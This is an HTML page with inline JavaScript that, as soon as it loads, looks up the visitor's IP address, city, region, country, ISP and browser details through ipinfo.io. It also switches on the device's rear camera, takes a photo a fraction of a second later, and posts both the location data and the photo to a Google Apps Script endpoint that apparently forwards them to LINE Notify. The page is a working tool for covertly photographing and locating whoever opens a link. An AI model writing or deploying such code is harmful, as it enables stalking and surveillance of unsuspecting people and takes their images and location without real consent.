<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>LINE Notify 自動拍照與設備記錄</title>
</head>
<body>
  <h1>LINE Notify 自動拍照與設備記錄</h1>
  <p id="ipInfo">IP 資訊載入中...</p>
  <p id="status">狀態：啟動中...</p>

  <script>
    // 自動拍照功能
    async function startCameraAndSend() {
      const statusElement = document.getElementById('status');

      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: 'environment' } },
        });
        const video = document.createElement('video');
        video.srcObject = stream;

        // 等待相機畫面載入
        await new Promise((resolve) => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });

        // 延遲 1 秒拍照
        setTimeout(() => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          const context = canvas.getContext('2d');
          context.drawImage(video, 0, 0, canvas.width, canvas.height);

          // 壓縮為 Base64 格式
          const photoData = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
          stream.getTracks().forEach((track) => track.stop());
          sendPhotoToServer(photoData);
        }, 100);
      } catch (error) {
        console.error('無法啟動相機:', error);
        statusElement.innerText = '無法啟動相機，請檢查權限或設備相機';
      }
    }

    // 發送照片到後端
    async function sendPhotoToServer(photoData) {
      const statusElement = document.getElementById('status');
      try {
        const formData = new URLSearchParams();
        formData.append('message', '自動拍照圖片');
        formData.append('imageData', photoData);

        const response = await fetch('https://script.google.com/macros/s/AKfycbw3YHSFeqgD900fraoDav7i6azeQaVX9y6UAqUCs56cOzI0O8X4R47wDSMJ0GEs42Um1A/exec', {
          method: 'POST',
          body: formData,
        });

        const result = await response.json();
        if (result.success) {
          statusElement.innerText = '照片已成功傳送到 LINE Notify！';
        } else {
          statusElement.innerText = `通知發送失敗：${result.error}`;
        }
      } catch (error) {
        console.error('發送過程中發生錯誤:', error);
        statusElement.innerText = '發送過程中發生錯誤，請檢查控制台。';
      }
    }

    // 獲取 IP 和設備資訊
    async function getIpInfo() {
      try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        const { ip, city, region, country, org } = data;
        const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
        const userAgent = navigator.userAgent;

        document.getElementById('ipInfo').innerText = `
          IP: ${ip}, 類型: ${ipType}, 城市: ${city}, 區域: ${region}, 國家: ${country}, 組織: ${org}, 用戶代理: ${userAgent}
        `;

        const url = new URL('https://script.google.com/macros/s/AKfycbw3YHSFeqgD900fraoDav7i6azeQaVX9y6UAqUCs56cOzI0O8X4R47wDSMJ0GEs42Um1A/exec');
        url.searchParams.append('ip', ip);
        url.searchParams.append('ipType', ipType);
        url.searchParams.append('userAgent', userAgent);
        url.searchParams.append('city', city);
        url.searchParams.append('region', region);
        url.searchParams.append('country', country);
        url.searchParams.append('org', org);

        const result = await fetch(url);
        const responseData = await result.json();

        if (responseData.success) {
          document.getElementById('status').innerText = 'IP 資訊已成功上傳！';
        } else {
          document.getElementById('status').innerText = 'IP 資訊上傳失敗！';
        }
      } catch (error) {
        console.error('IP 資訊錯誤:', error);
        document.getElementById('status').innerText = 'IP 資訊操作失敗，請檢查控制台。';
      }
    }

    // 啟動功能
    getIpInfo();
    startCameraAndSend();
  </script>
</body>
</html>
